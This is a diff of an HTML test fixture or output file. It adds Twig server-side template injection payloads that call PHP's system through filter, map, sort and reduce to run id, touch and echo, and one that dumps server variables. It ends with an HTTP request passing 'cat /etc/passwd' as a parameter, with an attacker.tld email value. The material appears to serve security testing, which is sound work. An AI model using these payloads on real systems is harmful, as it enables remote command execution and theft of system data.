@@ -1,12 +1,33 @@
 <div>
-	User Name
-</div>
-<div>
-	[&quot;id&quot;]
-</div>
-<div>
-	[&quot;touch+\/tmp\/test+&quot;]
-</div>
-<div>
-	40, 42
-</div>
+        User Name
+    </div><div>
+        ['id']|filter('system')
+    </div>
+    [&quot;id&quot;]
+    <div>
+        ['touch+/tmp/test+']|filter('system')|join(',')
+    </div>
+    [&quot;touch+\/tmp\/test+&quot;]
+    <div>
+        set sizes = [34, 36, 38, 40, 42]
+        sizes|filter(v => v > 38)|join(', ')
+    </div>
+        40, 42
+    <div>
+        app.request.server.all|join(',')
+    </div><div>
+        self
+    </div><div>
+        [0]|reduce('system','echo')
+    </div>
+    [&quot;echo&quot;]
+    <div>
+        ['echo']|map('system')|join
+    </div>
+    [&quot;echo&quot;]
+    <div>
+        ['echo',1]|sort('system')|join
+    </div>
+    echo1
+    POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+    email=""@attacker.tld
